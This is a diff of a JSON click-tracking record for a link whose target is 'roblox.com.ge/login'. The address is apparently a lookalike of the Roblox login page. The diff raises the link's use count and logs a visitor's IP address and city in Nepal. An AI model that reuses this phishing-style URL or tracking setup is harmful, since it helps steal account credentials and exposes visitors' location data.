@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1593,
+    "useCount": 1594,
     "createdBy": "admin",
     "clicks": [
       {
@@ -12907,6 +12907,14 @@
       },
       {
         "timestamp": 1777478562488,
+        "ip": "103.225.244.82",
+        "country": "Nepal",
+        "city": "Patan",
+        "flag": "🇳🇵",
+        "countryCode": "NP"
+      },
+      {
+        "timestamp": 1777478571651,
         "ip": "103.225.244.82",
         "country": "Nepal",
         "city": "Patan",
